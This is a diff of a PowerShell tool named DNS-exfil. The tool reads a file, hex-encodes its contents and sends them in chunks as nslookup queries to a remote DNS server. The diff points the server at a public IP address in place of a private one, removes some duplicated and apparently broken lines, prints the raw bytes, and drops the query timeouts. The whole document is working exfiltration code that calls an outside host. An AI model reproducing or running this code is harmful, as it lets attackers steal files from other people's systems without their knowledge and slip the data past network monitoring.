@@ -1,17 +1,7 @@
 function DNS-exfil
 {
     param ([string] $file)
-    $server = '192.168.0.17'
-    $bytes = [System.IO.File]::ReadAllBytes($file)
-    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
-    $hash = $hash -replace '-','';
-    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
-    $bytes = AES $bytes
-    $string = [System.BitConverter]::ToString($bytes);
-    $string = $string -replace '-','';
-    $filename = Split-Path $file -leaf
-    param ([string] $file)
-    $server = '192.168.0.17'
+    $server = '178.62.235.29'
     $bytes = [System.IO.File]::ReadAllBytes($file)
     $string = [System.BitConverter]::ToString($bytes);
     $string = $string -replace '-','';
@@ -19,6 +9,7 @@ function DNS-exfil
 
     $string = [System.BitConverter]::ToString($data);
     $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
+	write-host $bytes;
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
     $hash = $hash -replace '-','';
     $filename = Split-Path $file -leaf
@@ -66,12 +57,12 @@ function Send-DNSRequest {
     for($i=0; $i-lt$repeat; $i++){
         $str = $data.Substring($i*$Split,$Split);
         $str = $jobid + $str + '.' + $key;
-        $q = nslookup -querytype=A $str $server -timeout=0.1;
+        $q = nslookup -querytype=A $str $server;
     };
     if($remainder){
         $str = $data.Substring($len-$remainder);
         $str = $jobid + $str + '.' + $key;
-        $q = nslookup -querytype=A $str $server -timeout=0.1;
+        $q = nslookup -querytype=A $str $server;
     };
 };
 
